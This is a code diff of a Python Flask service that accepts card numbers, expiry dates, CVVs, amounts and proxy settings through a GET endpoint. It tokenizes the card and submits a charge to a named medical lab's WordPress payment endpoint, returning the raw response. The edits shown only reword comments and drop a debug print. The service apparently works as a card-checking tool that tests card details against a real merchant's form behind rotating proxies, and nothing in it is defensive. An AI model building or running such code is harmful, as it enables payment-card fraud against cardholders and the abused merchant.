@@ -53,13 +53,13 @@ def get_opaque_data(card_number: str, exp_month: str, exp_year: str, card_cvv: s
     response = requests.post(url, headers=headers, json=payload, proxies=proxy, timeout=30)
     data = json.loads(response.content.decode('utf-8-sig'))
 
-    # Print for debugging purposes
+    # Debugging output to inspect the response
     print("Opaque Data Response:", data)
 
     if data.get("messages", {}).get("resultCode") == "Ok":
         return data["opaqueData"]["dataValue"]
     else:
-        raise Exception(f"Error getting opaque data: {data.get('messages', {}).get('message', 'Unknown error')}")
+        raise Exception(f"Failed to get opaqueData: {data.get('messages', {}).get('message', 'Unknown error')}")
 
 def submit_payment(opaque_value: str, month: str, year: str, amount: str, proxy: dict):
     url = "https://avanticmedicallab.com/wp-admin/admin-ajax.php"
@@ -109,8 +109,7 @@ def submit_payment(opaque_value: str, month: str, year: str, amount: str, proxy:
 
     response = requests.post(url, headers=headers, files={k: (None, v) for k, v in form_data.items()}, proxies=proxy, timeout=30)
     
-    # Print raw response for debugging
-    print("Payment Response:", response.text)
+    # Return the raw response for debugging
     return response.text
 
 @app.route('/submit_payment', methods=['GET'])
@@ -121,7 +120,7 @@ def api_submit_payment():
     year = request.args.get('year')
     cvv = request.args.get('cvv')
     amount = request.args.get('amount', DEFAULT_AMOUNT)
-    
+
     # Extract proxy parameters
     proxy_http = request.args.get('proxy_http')
     proxy_https = request.args.get('proxy_https')
@@ -146,7 +145,7 @@ def api_submit_payment():
         opaque = get_opaque_data(card, month, year, cvv, proxy)
         raw_response = submit_payment(opaque, month, year, f"{amount:.2f}", proxy)
 
-        # Return the raw response directly
+        # Return the raw response directly for debugging
         return jsonify({
             "charged_amount": f"${amount:.2f}",
             "raw_response": raw_response,
